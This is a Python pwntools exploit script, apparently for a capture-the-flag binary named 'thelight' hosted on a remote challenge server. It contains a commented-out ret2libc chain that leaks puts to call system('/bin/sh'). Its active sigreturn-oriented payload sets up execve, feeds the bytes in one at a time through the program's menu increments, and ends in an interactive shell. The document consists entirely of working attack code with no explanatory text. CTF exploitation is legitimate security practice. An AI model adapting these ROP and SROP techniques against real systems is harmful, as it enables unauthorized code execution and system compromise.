from pwn import *
from icecream import ic

elf = exe = ELF("./thelight")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("0.cloud.chals.io", 24481)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x401350
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()
'''
pop_rdi = qgad(elf, "rdi")

payload = p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])

for i in range(4):
    sla(b'>', b'y')

for i in range(0x50-1):
    if i == 64:
        sla(b'>', b'1')
        ru(">")
        sla(b'>', b'5')
        ru(">")
        sla(b'>', b'6')
        ru(">")
    sla(b'>', b'5')
    ru(">")

for i in range(len(payload)):
    count = 0
    data = payload[i]
    while (data-count) >= 0xa:
        sla(b'>', b'4')
        ru(">")
        count = count + 0xa
    while (data-count) >= 0x5:
        sla(b'>', b'3')
        ru(">")
        count = count + 0x5
    while (data-count) >= 0x2:
        sla(b'>', b'2')
        ru(">")
        count = count + 0x2
    while (data-count) >= 0x1:
        sla(b'>', b'1')
        ru(">")
        count = count + 0x1
    sla(b'>', b'5')
    ru(">")
    sla(b'>', b'6')
    ru(">")

sla(b'>', b'7')
re(2)
libc.address = uu64(6) - libc.sym['puts']
ic(hex(libc.address))



payload = p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(gad(libc, ["ret"]))
payload += p64(libc.sym['system'])

for i in range(5):
    sla(b'>', b'y')

for i in range(0x50-1):
    if i == 64:
        sla(b'>', b'1')
        ru(">")
        sla(b'>', b'5')
        ru(">")
        sla(b'>', b'6')
        ru(">")
    sla(b'>', b'5')
    ru(">")

pause()
for i in range(len(payload)):
    count = 0
    data = payload[i]
    while (data-count) >= 0xa:
        sla(b'>', b'4')
        ru(">")
        count = count + 0xa
    while (data-count) >= 0x5:
        sla(b'>', b'3')
        ru(">")
        count = count + 0x5
    while (data-count) >= 0x2:
        sla(b'>', b'2')
        ru(">")
        count = count + 0x2
    while (data-count) >= 0x1:
        sla(b'>', b'1')
        ru(">")
        count = count + 0x1
    sla(b'>', b'5')
    ru(">")
    sla(b'>', b'6')
    ru(">")

# sla(b'>', b'7')
'''

gajj = 0x40141f
payload = p64(gajj)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x0000000000404058
frame.rsi = 0x0
frame.rdx = 0x0 
frame.rip = 0x0000000000401436
payload += bytes(frame)

for i in range(4):
    sla(b'>', b'y')

for i in range(0x50-1):
    if i == 64:
        sla(b'>', b'1')
        ru(">")
        sla(b'>', b'5')
        ru(">")
        sla(b'>', b'6')
        ru(">")
    sla(b'>', b'5')
    ru(">")

for i in range(len(payload)):
    flag = 0
    count = 0
    data = payload[i]
    while (data-count) >= 0xa:
        sla(b'>', b'4')
        ru(">")
        count = count + 0xa
        flag = 1
    while (data-count) >= 0x5:
        sla(b'>', b'3')
        ru(">")
        count = count + 0x5
        flag = 1
    while (data-count) >= 0x2:
        sla(b'>', b'2')
        ru(">")
        count = count + 0x2
        flag = 1
    while (data-count) >= 0x1:
        sla(b'>', b'1')
        ru(">")
        count = count + 0x1
        flag = 1
    sla(b'>', b'5')
    ru(">")
    if flag == 1:
        sla(b'>', b'6')
        ru(">")

sla(b'>', b'7')

io.interactive()
